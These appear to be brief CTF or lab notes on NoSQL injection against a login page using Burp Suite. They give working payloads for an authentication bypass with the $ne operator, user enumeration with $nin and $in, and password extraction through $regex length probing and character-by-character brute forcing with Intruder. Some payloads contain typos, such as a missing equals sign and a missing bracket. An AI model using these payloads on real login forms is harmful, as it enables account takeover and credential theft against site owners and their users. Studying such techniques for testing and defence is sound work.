## Login Page:

### 1: Burpsuite

### 2: Random input creds (test,tset)

### 3: user[$ne]=test&pass[$ne]tset

### This forces the database to return all user documents and as a result we are logged in.

## Logging in as other users:

### Use [$nin][] to retrieve a list of values to ignore. Keep using until it throws an error (user enumeration)

### Example:

#### user[$in][]=admin&user[$nin[]=john&pass[$ne]=pass

## Extracting users' passwords

### [$regex]=^.{num}$

#### Then if you found the num,

### pass[$regex]=^........$ then use a wordlist for 1 letter/number/symbol for each row until it guesses it with intruder.
